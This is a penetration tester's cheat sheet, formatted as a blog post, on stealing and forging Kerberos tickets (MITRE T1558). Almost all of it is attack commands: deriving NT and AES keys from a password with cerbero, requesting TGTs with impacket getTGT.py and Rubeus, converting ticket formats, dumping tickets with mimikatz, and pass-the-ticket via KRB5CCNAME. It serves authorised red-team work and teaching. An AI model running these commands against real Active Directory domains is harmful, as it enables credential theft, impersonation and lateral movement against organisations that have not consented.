---
layout: post
title: TA0006 Credentials Forgery - Kerberos
category: pen
parent: cheatsheets
modified_date: 2023-06-09
permalink: /pen/krb
---

**Mitre Att&ck Entreprise**: [T1558 Steal and Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) 

**Menu**
<!-- vscode-markdown-toc -->
1. [prereq](#prereq)
2. [get-nthash](#get-nthash)
3. [get-tgt](#get-tgt)
4. [ccache-convert](#ccache-convert)
5. [krb-export](#krb-export)
6. [krb-ptt](#krb-ptt)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

##  1. <a name='prereq'></a>prereq

* Which OS ? What Creds ?
![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)

### tools

* [Rubeus compilation wiki](https://github.com/GhostPack/Rubeus)
* cerbero
* tickey
* impacket

##  2. <a name='get-nthash'></a>get-nthash
```
# compute nthash from clear-text password
cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
$ztarg_user_nthash=""
$ztarg_user_aes256k=""
```

##  3. <a name='get-tgt'></a>get-tgt
```
getTGT.py $zdom_fqdn/$ztarg_user_name@$ztarg_dc_fqdn -aesKey $ztarg_user_aes256k -dc-ip $zdom_dc_ip
getTGT.py $zdom_fqdn/$ztarg_user_name@$ztarg_computer_fqdn -aesKey $ztarg_user_aes256k -dc-ip $zdom_dc_ip

cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv

cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
```

##  4. <a name='ccache-convert'></a>ccache-convert

* Convert linux to windows krb ticket :
```
ticketConverter.py $ztarg_user_name.ccache $ztarg_user_name.krb
cerbero convert -i $ztarg_user_name.ccache -o $ztarg_user_name.krb
```

##  5. <a name='krb-export'></a>krb-export
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

##  6. <a name='krb-ptt'></a>krb-ptt
```bash
# linux
export KRB5CCNAME="$PWD/$ztarg_user_name.krb" 
```

